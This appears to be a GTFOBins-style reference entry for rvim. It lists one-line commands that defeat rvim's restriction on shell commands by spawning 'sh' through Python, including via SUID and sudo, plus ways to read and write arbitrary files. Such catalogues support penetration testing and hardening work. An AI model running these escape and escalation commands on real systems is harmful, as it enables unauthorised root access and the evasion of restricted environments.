---
description: 'From the manual: with rvim "It will not be possible to start shell commands".'
functions:
  shell:
    - code: rvim -c ':py import os;os.system("sh")'
  file-write:
    - code: |
        rvim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: rvim file_to_read
  suid:
    - code: ./rvim -c ':py import os;os.system("sh")'
  sudo:
    - code: sudo rvim -c ':py import os;os.system("sh")'
---
